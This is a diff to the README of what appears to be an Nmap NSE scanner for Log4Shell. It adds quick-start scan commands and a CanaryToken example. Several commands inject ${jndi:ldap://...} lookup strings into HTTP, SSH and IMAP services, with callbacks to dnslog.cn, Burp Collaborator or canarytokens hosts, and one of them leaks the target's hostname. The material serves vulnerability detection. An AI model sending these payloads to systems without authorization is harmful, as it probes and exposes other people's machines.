@@ -10,9 +10,28 @@ Note that NSE scripts will only issue the requests to the services. Nmap will no
 Also note that DNS resolution with prefixes combination in a expression for log4j-core <= 2.7 seems not supported. So, testing with something like ```${java:os}``` could lead to false negatives.
 Therefore, better to have few false positives than negatives.
 
+## Quick with help of dnslog.cn
+
+Position to directory where these scripts are located and issue following commands.
+
+On Linux:
+```
+cd nse-log4shell
+nmap -T4 -v --script=$PWD/ scanme.nmap.org
+```
+
+On Windows:
+```
+cd nse-log4shell
+nmap -T4 -v --script=%cd%/ scanme.nmap.org
+```
+
+
+## Manual configuration
+
 Windows Example (Thanks to @ZedFuzz) - note how to [escape the quotes](https://nmap.org/book/nse-usage.html#nse-args):
 ```
-nmap -v --script=http-log4shell,ssh-log4shell,imap-log4shell "--script-args=log4shell.payload=\"${jndi:ldap://{{target}}.xxxx.dnslog.cn}\"" -T4 -n -p22,80 --script-timeout=1m scanme.nmap.org
+nmap -v --script=http-log4shell,ssh-log4shell,imap-log4shell "--script-args=log4shell.payload=\"${jndi:ldap://{{target}}.xxxx.dnslog.cn}\"" -T4 -n --script-timeout=1m scanme.nmap.org
 ```
 
 ### By help of logdns (custom DNS logging server)
@@ -37,6 +56,16 @@ Take your domain from Burp collaborator and replace xxxx with your domain:
 ```
 nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://{{target}}.xxxx.burpcollaborator.net/diverto}"' -T4 -n -p0-65535 --script-timeout=1m MY.IPs.TO.SCAN
 ```
+
+### By help of CanaryToken (https://canarytokens.org/generate#)
+
+Take your Token from CanaryToken and replace xxxx with your domain:
+
+```
+nmap --script=http-log4shell,ssh-log4shell,imap-log4shell  '--script-args=log4shell.payload="${jndi:ldap://x${hostName}.L4J.xxxx.canarytokens.com/a}"' -T4 -n -pssh,imap*,http* --script-timeout=1m MY.IPs.TO.SCAN
+```
+
+Thanks to @saintz666
 
 # Solution/Fixes
 
